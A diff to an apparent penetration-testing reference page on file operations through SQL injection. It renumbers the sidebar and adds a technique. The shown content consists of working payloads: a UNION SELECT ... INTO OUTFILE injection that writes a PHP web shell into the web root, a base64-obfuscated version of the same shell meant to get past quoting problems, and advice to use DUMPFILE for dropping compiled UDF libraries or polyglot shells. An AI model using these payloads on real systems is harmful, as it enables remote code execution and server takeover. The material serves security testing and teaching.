@@ -6,7 +6,7 @@ d3fend: [D3-MH, D3-EI, D3-FA]
 impact: [FileRead, FileWrite, RCE]
 owasp: [A05]
 sidebar:
-  order: 11
+  order: 12
   label: File operations
 ---
 import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
@@ -112,6 +112,14 @@ To write to a path with a known column count:
 ```sql
 ' UNION SELECT '<?php system($_GET[0]); ?>',2,3,4 INTO OUTFILE '/var/www/html/x.php'-- -
 ```
+
+For binary content, or payloads whose quotes/newlines break the injection, wrap the data with `FROM_BASE64()` so only base64 characters travel in the query:
+
+```sql
+' UNION SELECT FROM_BASE64('PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4='),2,3,4 INTO OUTFILE '/var/www/html/x.php'-- -
+```
+
+`DUMPFILE` instead of `OUTFILE` writes the bytes verbatim with no row/column formatting - use it when writing an exact binary (a compiled UDF `.so`, an image-polyglot shell).
 
 When the web root path is unknown, common locations:
 ```
